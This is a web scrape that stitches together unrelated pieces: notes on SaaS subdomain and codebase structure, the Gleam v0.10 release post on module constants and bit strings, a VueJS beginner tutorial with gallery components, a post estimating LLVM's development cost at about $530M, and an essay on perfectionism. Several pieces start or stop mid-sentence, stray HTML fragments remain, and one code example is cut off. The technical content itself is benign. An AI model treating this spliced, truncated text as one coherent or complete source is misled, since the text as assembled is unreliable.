<p><a href="https://clubhouse.io/blog/building-a-saas-app-you-should-probably-stick-to-a-single-subdomain-455695e1d03c/" target="_blank" rel="noopener">Here</a> is the article from Clubhouse written by Andrew Childs, Chief Design Officer and Co-founder of Clubhouse.</p>

<p>Here is a quote from that article explaining their recommendation:</p>
<blockquote>
  <p>If you’re building a SaaS app that has any third-party OAuth integrations, or your product allows a user to switch between multiple organizations, you should put the organization in the pathname and use a single subdomain (like “app”) for your application.</p>
</blockquote>

<p>Key takeaways from the article:</p>
<ol>
  <li>Having the organization slug  in the pathname makes it easier to switch organizations and to work with different URLs in dev/staging and production</li>
  <li>It is easier to whitelist the domain in case you are working with OAuth providers (as you only need to whitelist a single domain). In this case, you don’t need to rely on third-party providers to support wildcard domains.</li>
  <li>It allows us to get an Extended Validation SSL certificate as these are not assigned to wildcard domains.</li>
</ol>

<p><em>3. Winderwind - How to select a future-proof subdomain structure</em></p>

<p>Source of the article is <a href="https://winterwindsoftware.com/how-to-select-a-future-proof-subdomain-structure-for-saas-web-app/" target="_blank" rel="noopener">here</a></p>

<p>The article recommends the following structure:</p>
<ol>
  <li>The marketing website should be on the main domain and separated from the product app</li>
  <li>The product app should live on its own subdomain. Here are some suggestions from the article:
a. <em>dashboard</em> – Used by  <a href="https://stripe.com/" target="_blank" rel="noopener">Stripe</a> 
b. <em>manage</em> – Used by  <a href="https://gocardless.com/" target="_blank" rel="noopener">GoCardless</a> 
c. <em>portal</em> – This is what I use for  <a href="https://autochart.io/" target="_blank" rel="noopener">Autochart</a> 
d. <em>my</em> – Used by  <a href="https://www.xero.com/" target="_blank" rel="noopener">Xero</a> 
e. <em>account</em> – Used by  <a href="https://postmarkapp.com/" target="_blank" rel="noopener">Postmark</a> 
f. <em>secure</em> – Used by  <a href="https://helpscout.net/" target="_blank" rel="noopener">HelpScout</a>
</li>
  <li>Keep the marketing site and the blog on the same domain</li>
  <li>Keep the API on the same subdomain as the product app</li>
</ol>

<p>Reasons for separating the marketing website and product app from the article are:</p>
<ol>
  <li>It makes it easy to work with non-technical people on the marketing website and minimizes downtime when upgrading them</li>
  <li>It allows using static CDN for the marketing website</li>
</ol>

          Arguments for my recommendations <a href="#arguments-for-my-recommendations">#</a>
        
        
      </h2>
    
      <h3 id="use-separate-codebases-for-product-app-and-marketing-website">
        
        
          Use separate codebases for product app and marketing website <a href="#use-separate-codebases-for-product-app-and-marketing-website">#</a>

          Reasons for separate codebase <a href="#reasons-for-separate-codebase">#</a>
        
        
      </h4>

<p>Even if you are a single owner of your project, it makes sense to have this split between codebases because it will first and foremost make sure bugs don’t leak between these two components. Imagine a bug in your CSS/JS flow while trying to fix something on the marketing website that might impact your customers who are using your product app. It makes the testing easier because you can have different test coverage and test thoroughness, allowing you, for example, to say that the marketing website should only pass several N positive scenarios without being concerned with negative scenarios.</p>

<p>The second biggest advantage is having different release schedules between them. You can play more easily with the marketing website (A / B testing, testing copywrite, SEO tags) and release them as often as you like without any (let’s say this again without any) concern for a possible effect of your existing customers of the product app. It decreases downtime for users of the product app. You don’t need to restart product app services each time you want to add/change/remove a text from the marketing website.</p>

<p>The third advantage is related to the ability to use different frameworks and languages for marketing website than for the product app, thus allowing you also to use different hosting services if you like without having to create a complicated release process. You can decide to make your marketing website a static website generated by Jekyll or Middleman or Ghost and then release it to Netlify while using Ruby or Python or Elixir for your product app and host them on AWS or Heroku or Digital Ocean.</p>
    
      <h4 id="concerns-against">
        
        
          Concerns against <a href="#concerns-against">#</a>
        
        
      </h4>

<p>First, DO NOT DO separate codebases if you plan to show live data (or as fresh as possible) in your marketing website from your product app (like the number of accounts created so far …). In this case, you need to create and maintain an API server and client with maybe authentication or at least a security layer, and there is no need for this.</p>

<p>The biggest concern is related to the branding synchronization among the two projects. You need to have consistent branding (using the same colors, fonts, sizes, elements). This impairs your speed when changing these attributes. For this, there is no quick fix. 
What can be done is creating a separate project where you maintain your CSS and JS, maybe also some HTML components, and then use two in your two projects. Of course, this comes with extra maintenance overhead.</p>

<p>The second concern is the overhead needed to maintain two codebases and their release scripts. There is, in the beginning, a small overhead to setup CI/CD for both projects with most of the time spent into creating the automated testing environment.</p>

<p>The third concern is code reuse, especially if you are using the same …</p></div></div>

July 1, 2020 | https://lpil.uk/blog/gleam-v0.10-released/ | <a href="https://web.archive.org/web/*/https://lpil.uk/blog/gleam-v0.10-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>1 month and 10,910 lines of code later it is time for another Gleam
release! Let’s see what’s new this time.</p>

<h2 id="module-constants">Module constants</h2>

<p>Sometimes we want to use a certain fixed value in multiple places in our
project. Until now we’ve had two options. The first option was to copy and
paste the value into multiple places in our code.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>2101</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>2111</span>
<span>}</span>
</code></pre></div></div>

<p>Duplication of values like this is error prone, especially if we want to
update the values later, as we’ll need to find every place it’s used in order
to change it.</p>

<p>Another option is to wrap the value in a function.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2111</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span><span>()</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>This is better than copying the value in our code, but isn’t yet ideal. A
function can perform any amount of computation (with side effects!) when it is
called, so we have to read the definition of the function to be sure what it
does.</p>

<p>To make matters worse Gleam’s case clause guards don’t support calling of
functions within them, so this code will be rejected by the compiler:</p>

<div><div><pre><code><span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>

<p>To solve all these problems Gleam now has module constants. They are always
inlined by the compiler, and can be used in case clause guards.</p>

<p>Using them the above code can be rewritten like so:</p>

<div><div><pre><code><span>pub</span> <span>const</span> <span>start_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2101</span>
<span>pub</span> <span>const</span> <span>end_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2111</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span>
<span>}</span>

<span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Much better! Module constants are going to provide the basis of some exciting
new features in future, so watch this space. 🚀</p>

<p>Thanks to <a href="https://github.com/thehabbos007">Ahmad Sattar</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="bit-string-syntax">Bit string syntax</h2>

<p>One of great things about Erlang is how easy it is to work with raw bits and
bytes using the bit string literal syntax. Starting with this release Gleam
supports this too!</p>

<p>Explaining all the things one can do with the bit string syntax would take
longer than I have now, but in short they give a declarative way of
constructing and parsing raw data of any format. What’s more the Erlang VM is
highly optimised for this, so bit syntax is highly efficient too!</p>

<p>For example, if I wanted to create a 4 byte unsigned little endian integer
with the value of 100 I could do so using bit syntax like this:</p>

<div><div><pre><code><span>let</span> <span>my_integer</span> <span>=</span> <span>&lt;&lt;</span><span>100</span><span>:</span><span>unsigned</span><span>-</span><span>little</span><span>-</span><span>int</span><span>-</span><span>size</span><span>(</span><span>4</span><span>)</span><span>&gt;&gt;</span>
</code></pre></div></div>

<p>Or if I wanted to extract the title, artist, album, year, and comment from an
MP3 music file’s ID3 tags I could pattern match on it like this:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>get_metadata</span><span>(</span><span>id3</span><span>:</span> <span>BitString</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>(</span><span>Metadata</span><span>,</span> <span>String</span><span>)</span> <span>{</span>
  <span>case</span> <span>id3</span> <span>{</span>
    <span>&lt;&lt;</span>
      <span>"TAG"</span><span>:</span><span>utf8</span><span>,</span>
      <span>title</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>artist</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>album</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>year</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>4</span><span>),</span>
      <span>comment</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>_</span><span>rest</span><span>:</span><span>binary</span><span>,</span>
    <span>&gt;&gt;</span> <span>-&gt;</span> <span>Ok</span><span>(</span><span>Metadata</span><span>(</span><span>title</span><span>,</span> <span>artist</span><span>,</span> <span>album</span><span>,</span> <span>year</span><span>,</span> <span>comment</span><span>))</span>

    <span>_</span> <span>-&gt;</span> <span>Error</span><span>(</span><span>"Not a valid ID3 tag"</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Thanks to <a href="https://benjamintan.io/blog/2014/06/10/elixir-bit-syntax-and-id3/">Benjamin Tan’s blog post</a>
for this example.</p>

<p>For another example of bit syntax in action check out this <a href="https://github.com/lpil/ecoji/"><em>very serious</em>
base64 encoding alternative</a> which converts arbitrary data into emojis!</p>

<p>As part of this new feature we have introduced <code>BitString</code> and <code>UtfCodepoint</code>
types into the prelude, and split the standard library <code>Iodata</code> type into
<a href="https://hexdocs.pm/gleam_stdlib/gleam/string_builder/"><code>StringBuilder</code></a> and <a href="https://hexdocs.pm/gleam_stdlib/gleam/bit_builder/"><code>BitBuilder</code></a> types, which
are for efficiently constructing strings and bit strings respectively.</p>

<p>Thanks to <a href="https://github.com/tomwhatmore">Tom Whatmore</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="the-rest">The rest</h2>

<p>There are many more new additions, improvements, and bug fixes to the compiler and
the standard library, including but not limited to support for regex expressions
(implemented by <a href="https://github.com/eterps/">Erik Terpstra</a>) and environment
variables (implemented by <a href="https://github.com/crowdhailer/">Peter Saxton</a>).</p>

<p>For information on the rest in this release please check out the <a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md#v0100---2020-07-01">Gleam
changelog</a> and the <a href="https://github.com/gleam-lang/stdlib/blob/main/CHANGELOG.md#v0101---2020-07-01">standard library
changelog</a>.</p>

virtual machine a production-ready reality please consider <strong><a href="https://github.com/sponsors/lpil">sponsoring

<p>I’ve been playing with VueJS recently. I’m impressed. It’s simple, powerful, super fun and incredibly popular. Even a moron like me can do interesting things with it rapidly. It just goes to show that anybody can do great things with it. Do you have five minutes in front of you ?</p>



<h3>Once upon a time</h3>



<p>2012 in the New York area. <strong>At that time <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/youyuxi" target="_blank" rel="noreferrer noopener">Evan You</a> is living his best life learning Javascript.</strong> He’s doing side projects left and right for laughs. One of them explodes in <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://news.ycombinator.com/item?id=3618387" target="_blank" rel="noreferrer noopener">popularity on Hackernews</a> ! Evan didn’t know, but he just got Google’s attention.</p>



<figure><img src="https://i.imgur.com/8wEZsjZ.png" data-src="https://i.imgur.com/8wEZsjZ.png" alt="vuejs"></figure>



<p>Very quickly hired at Google, his role is to create “experimental projects” for innovative ideas. He uses a lot of vanilla Javascript. He tries AngularJS and other frameworks, but he rages instantly on it. He doesn’t find the freedom he needs. So he had an idea : <strong>extract the best part of these frameworks and make his own light and malleable framework for his own personal need</strong>.</p>



<p>In July 2013, the first commit of VueJS was made. For the record, VueJS was to be called Seed.JS. But it was taken on NPM! Since its framework is centered around the view part, Evan wanted something that looked like “View” in English. He went to google translate and translated “View” into several languages. <strong>He came across the French translation “Vue” and <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.youtube.com/watch?v=OrxmtDw4pVI&amp;feature=youtu.be&amp;t=374" target="_blank" rel="noreferrer noopener">found it cool</a>.</strong> A few minutes later, VueJS was published.</p>



<p>In 2014, the first version of VueJS arrived on the Internet. The project doesn’t explode right away. But like <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/taylorotwell/status/590585596780879872" target="_blank" rel="noreferrer noopener">the creator of Laravel</a>, more and more people are talking about it. Today, <a href="https://npm-stat.com/charts.html?package=react&amp;package=vue&amp;package=angular&amp;from=2014-05-20&amp;to=2020-05-20" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">VueJS is in the big league</a>.</p>



<h3>What is VueJS ?</h3>



<p><strong>VueJS is a Javascript frontend framework to create user interfaces.</strong> You’re going to say “one more?” and the answer is yes. Except it’s a little different.</p>



<p><strong>First, it’s interesting to understand that VueJS was designed to be incrementally integrated</strong>. That means if you have an existing frontend application, you don’t have to redo everything. You can make a new part in VueJS and quickly integrate it with the rest.</p>



<p>VueJS is also the most is easy to pick up of all the frontend framework. <strong>That’s what attracted me as a backend developer in the first place. </strong>Very quickly, I did some frontend stuff that worked ! I was shocked! Within a few hours of reading the doc and testing stuff, I had understood all the basics. I was already shipping frontend.</p>



<figure><img src="https://i.imgur.com/UTgj9wh.png" data-src="https://i.imgur.com/UTgj9wh.png" alt="ship"></figure>



<p>VueJS also takes good ideas from its competitors. It allows data binding.<strong> The data and the DOM are coupled and reactive to changes.</strong> We also find <a href="https://bitsofco.de/understanding-the-virtual-dom/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">the concept of virtual dom</a> with VueJS. The DOM is not directly changed, it goes through the virtual DOM.</p>



<p>We also find <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components.html" target="_blank" rel="noreferrer noopener">the organization by component</a>. <strong>This feature allows you to divide your application into several sub-components that each manage their own life and are reusable.</strong> Let’s imagine you want to make a list of images: you can make a component that manages an image and a component that manages a list of image components.</p>



<p>That’s all well and good, but how does it work?</p>



<h3>How does it work?</h3>



<p>For once I cheat a bit and show some code in advance to better understand what’s coming next. Hello World!</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;script src="https://cdn.jsdelivr.net/npm/vue"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;{{ message }}&lt;/div&gt;
    &lt;script&gt;
      const data = { message: "Hello World !" };
      new Vue({
        el: "#app",
        data: data
      });
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>



<p>VueJS focuses on the view part of your application.<strong> To do so, the framework is partly inspired by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel" target="_blank" rel="noreferrer noopener">the MVVM architecture pattern</a>.</strong> VueJS will link your DOM, the view part, with your view instance, the Model-View part. These two parts are linked by the data-binding system.</p>



<p>Finally, the data in your view instance is the Model part. <strong>It will provide your application with data.</strong> The Hello World code schematized looks like this.</p>



<div><figure><img src="https://i.imgur.com/p3IKY9G.jpg" data-src="https://i.imgur.com/p3IKY9G.jpg" alt="vuejs"></figure></div>



<p>A VueJS application is composed of one or more components. When the instance of the global application is launched, there is first a root instance. <strong>This is root instance is composed of a tree of components which have their own root instance.</strong></p>



<p>But what happens to the life cycle of your instance when you create the component with new Vue()? I wanted to make my usual silly schema but it turns out that t<strong>he official VueJS doc is just EXCELLENT</strong>. <a href="https://www.jesuisundev.com/en/please-write-your-technical-documentation/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">It’s rare to have a good documentation</a>. So I’m just going to pump their schema.</p>



<div><figure><img src="https://vuejs.org/images/lifecycle.png" data-src="https://vuejs.org/images/lifecycle.png" alt="vuejs"></figure></div>



<p>I’ll let you admire it and figure out what’s going on. The only thing that might be unclear is the difference between “created” and “mounted”.</p>



<ul><li><strong>Created </strong>means that the element is only available in the View-Model part.</li><li><strong>Mounted </strong>in VueJS means that the DOM element has been rendered in your page and you can manipulate it.<br></li></ul>



<p>OK great, now let’s get our hands dirty.</p>



<h3>Show me the code</h3>



<p>I’m gonna show you a piece of code I made for a personal need. <strong>A simple responsive gallery with only three components.</strong> We start with the root app.</p>



<p><strong>app.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div id="app"&gt;
    &lt;action v-bind:message="messageAction"&gt;&lt;/action&gt;
    &lt;grid v-bind:photos="photos"&gt;&lt;/grid&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  import action from './components/action.vue'
  import grid from './components/grid.vue'

  export default {
    name: 'App',
    components: { action, grid },
    data: function () {
      return {
        photos: [
          {
            id: 0,
            url: "https://i.imgur.com/p3IKY9G.jpg"
          }
        ],
        messageAction: "It's working !"
      }
    }
  }
&lt;/script&gt;

&lt;style&gt;
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: Arial;
  }
&lt;/style&gt;</pre>



<p>On the <strong>template side</strong> I start by declaring my root app in a div. Inside there are two other components (action and grid). <strong>Note how I pass the data that comes from the instance seen in the components with the v-bind directives.</strong></p>



<p>On the <strong>script side</strong>, I import the components to use them in the app we export. We declare the data, the pictures and a message, which is reactive to changes.</p>



<p>On the <strong>style side</strong> I integrate very simple CSS that is global to the whole project.</p>



<p>Next up, the action component.</p>



<p><strong>action.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="callToAction"&gt;
    &lt;h1&gt;{{ message }}&lt;/h1&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'callToAction',
    props: {
      message: String
    }
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .callToAction {
    position: absolute;
    height: 100%;
    width: 100%;
    padding: 0;
    margin: 0;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  h1 {
    color: red;
    background:black;
    padding: 10px;
  }
&lt;/style&gt;
</pre>



<p>The action component is simply a text that we put in the middle of the page and that will be a call to action for the user.<strong> I use the {{ message }} syntax to display the message that comes from the app.</strong></p>



<p>Note also that the style part is “scoped”. <strong>This means that the CSS in question has effect only in this component.</strong> This is very useful to separate the style scope of each component.</p>



<p><strong>grid.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="grid"&gt;
    &lt;div v-bind:key="grid.id" v-for="grid in grids" class="column"&gt;
      &lt;photo
        v-for="photo in grid" 
        v-bind:photo="photo" 
        v-bind:key="photo.id"
      &gt;&lt;/photo&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import photo from './photo.vue'

export default {
  name: 'grid',
  components: { photo },
  props: ['photos'],
  computed: {
    grids: function () {
      const grids = []
      const deepClonePhotos = JSON.parse(JSON.stringify(this.photos))
      const gridsToMake = Math.ceil(deepClonePhotos.length / 2) - 1
      
      for (let index = 0; index &lt;= gridsToMake; index++) {
        const currentGrid = []

        for(let i = 0; i &lt; 2; i++) {
          if(deepClonePhotos.length) {
            currentGrid.push(deepClonePhotos.shift())
          }
        }
        
        grids.push(currentGrid)
      }

      return grids
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
  .grid {
    display: -ms-flexbox; /* IE10 */
    display: flex;
    -ms-flex-wrap: wrap; /* IE10 */
    flex-wrap: wrap;
    padding: 0;
  }

  /* Create four equal columns that sits next to each other */
  .column {
    -ms-flex: 25%; /* IE10 */
    flex: 25%;
    max-width: 25%;
    padding: 0;
  }

  /* Responsive layout - makes a two column-layout instead of four columns */
  @media screen and (max-width: 800px) {
    .column {
      -ms-flex: 50%;
      flex: 50%;
      max-width: 50%;
    }
  }

  /* Responsive layout - makes the two columns stack on top of each other instead of next to each other */
  @media screen and (max-width: 600px) {
    .column {
      -ms-flex: 100%;
      flex: 100%;
      max-width: 100%;
    }
  }
&lt;/style&gt;
</pre>



<p>The grid component is the one that will make the logic to display image grids in relation to the data it receives from the app. In the template part I create a column every two images. In these columns I display my two images. I do this using another photo component. <strong>You will notice the use of the v-for directive to browse my lists.</strong></p>



<p>In the script part, <strong>I use <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components-props.html" target="_blank" rel="noreferrer noopener">props</a> to get the data passed by the v-bind in the app</strong>. Then I use the computed function to create a new grids variable with the data of the pictures.</p>



<p><strong>photo.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;img :src="photo.url" alt ="" /&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'photo',
    props: ['photo']
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .column img {
    vertical-align: middle;
    width: 100%;
  }
&lt;/style&gt;
</pre>



<p>The photo component just allows me to isolate the display of the photo in a corner. It’s quite simple, but it allows me to change a lot of things on this side in the future without having to touch the logic above! <strong>As usual, I put a little <a href="https://codesandbox.io/s/vuejs-en-5-minutes-fz4h4" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">codesandbox</a>, you can play with it and see it all in action.</strong></p>

July 1, 2020 | https://chriscummins.cc/2019/llvm-cost/ | <a href="https://web.archive.org/web/*/https://chriscummins.cc/2019/llvm-cost/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <p><em><strong>tl;dr</strong> 1.2k developers have produced a 6.9M line code base with an estimated price tag of $530M.</em></p> <hr> <p>“Compilers are expensive to build” is a recurring theme in my research. I hope this is an uncontroversial sentiment, but wouldn’t it be nice if we could attach a metric to this claim? For example, how much has <a href="https://llvm.org/">LLVM</a> development <em>cost</em>? I haven’t been able to find a credible estimate for this, but the good news is that the source code and full development history is freely available, so we can use that to make our own.</p> <p>We’ll start by grabbing the source code for the LLVM umbrella project and its test suite:</p> <div><div><pre><code><span>$ </span>git clone https://github.com/llvm/llvm-project.git llvm
<span>$ </span>git clone https://github.com/llvm/llvm-test-suite.git llvm/test-suite
</code></pre></div></div> <p>We’ll use the most recent release at the time of writing, 8.0.1:</p> <div><div><pre><code><span>$ </span>git <span>-C</span> llvm checkout llvmorg-8.0.1
<span>$ </span>git <span>-C</span> llvm/test-suite checkout llvmorg-8.0.1
</code></pre></div></div> <p>To start with, let’s count commits:</p> <div><div><pre><code><span>$ </span><span>(</span>git <span>-C</span> llvm shortlog <span>-s</span> <span>-n</span><span>;</span> git <span>-C</span> llvm/test-suite shortlog <span>-s</span> <span>-n</span><span>)</span> <span>\</span>
    | q <span>'SELECT SUM(c1) FROM -'</span>
</code></pre></div></div> <p>Which informs us there have been 312,036 commits across the two projects. The same git commands can tell us that there have been 1,210 unique contributors:</p> <div><div><pre><code><span>$ </span><span>(</span>git <span>-C</span> llvm shortlog <span>-s</span> <span>-n</span><span>;</span> git <span>-C</span> llvm/test-suite shortlog <span>-s</span> <span>-n</span><span>)</span> <span>\</span>
    | <span>awk</span> <span>'{$1=""}1'</span> | <span>sort</span> <span>-u</span> | <span>wc</span> <span>-l</span>
</code></pre></div></div> <p>How many lines of addition and deletion is that?</p> <div><div><pre><code><span>$ </span><span>(</span>git <span>-C</span> llvm log <span>--format</span><span>=</span>tformat: <span>--numstat</span><span>;</span> <span>\</span>
   git <span>-C</span> llvm/test-suite log <span>--format</span><span>=</span>tformat: <span>--numstat</span> <span>\</span>
   <span>)</span> | q <span>-t</span> <span>'SELECT SUM(c1), SUM(c2) FROM -'</span>
</code></pre></div></div> <p>LLVM 8.0.1 is the culmination of 81,033,801 line additions and 22,048,147 line deletions. That is nice, but it (a) doesn’t tell us how much <em>code</em> there is, and (b) doesn’t assign a dollar cost.</p> <p>Let’s turn to David A. Wheeler’s <a href="https://dwheeler.com/sloccount/">sloccount</a> to get both <em>logical</em> source line counts, and a development cost estimate based on a <a href="https://en.wikipedia.org/wiki/COCOMO">COCOMO</a> model. We’ll leave the parameters of the model as default, but we’ll update the 19-year old salary estimate using a contemporary US average from <a href="https://www.glassdoor.com/Salaries/us-software-engineer-salary-SRCH_IL.0,2_IN1_KO3,20.htm?countryRedirect=true">glassdoor</a>:</p> <div><div><pre><code>$ sloccount --personcost 103035 llvm
</code></pre></div></div> <p>Which tells us that LLVM 8.0.1 comprises 6,887,489 lines of code, with an estimated development cost of <strong>$529,895,190</strong>. I suppose by most definitions that should qualify as expensive. At least, it is certainly more expensive than funding research to make compiler construction cheaper :-)</p> <p>Do you have any references for the dollar costs of building a compiler? Please get in touch!</p> <hr> <p>P.S: I used the same methodology to compute estimated costs for 10 popular compilers, which made its way into the introduction of <a href="https://github.com/ChrisCummins/phd/tree/master/docs/thesis">my thesis</a>:</p> <p><img src="https://chriscummins.cc/img/2019-07-26-compiler-costs.png"></p>  </div></div>]]>

<p>Words connect, the creative juices flow, and I’m able to get a lot done.</p>

<p>But as I get closer to the end, things start slowing down <em>dramatically</em>.</p>

<p>I scroll back and re-read what I’ve written.</p>
<p>Shit. Everything sounds terrible.</p>
<p>All of it makes no sense. None of the concepts stand out. I feel like I need to revise the whole thing.</p>
<p>As these thoughts bombard my brain, my once-confident pace slows to an exhausting <em>crawl</em>.</p>

<p>Perfectionism is when the last 5% of a project feels like 95% of the work.</p>
<p>It’s when you feel like you’re close to the finish line, but you won’t allow yourself to cross it. It’s when you obsess over every last word, every little brushstroke, every final note. It’s the belief that what you have now doesn’t fit the vision you had, so you must work tirelessly to get there.</p>
<p>Perfectionism is the inability to let your expectations go.</p>

<p>The project status bar makes the most sense when we view it alongside this gradation of expectations.</p>
<p>In the beginning, you don’t have any expectations because you haven’t created anything yet. No one expects a blank notebook to be their next bestseller.</p>
<p>When you face a fresh canvas, it’s easy to try out all kinds of ideas. This allows you to build things quickly without much hesitation, and without much expectation:</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations.png" alt="" width="1500" height="1335" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations-300x267.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations-1024x911.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations-768x684.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223544/A06-No-Expectations-610x543.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>But as your ideas stack on top of one another, a recognizable theme begins to develop. Narrative arcs start taking shape. Points connect with other points, and there’s an expectation for them to keep connecting with more.</p>
<p>A body of work slowly builds, which is exciting. You’re not quite sure what the end result will be, but you start developing the expectation that it’ll at least be something interesting:</p>
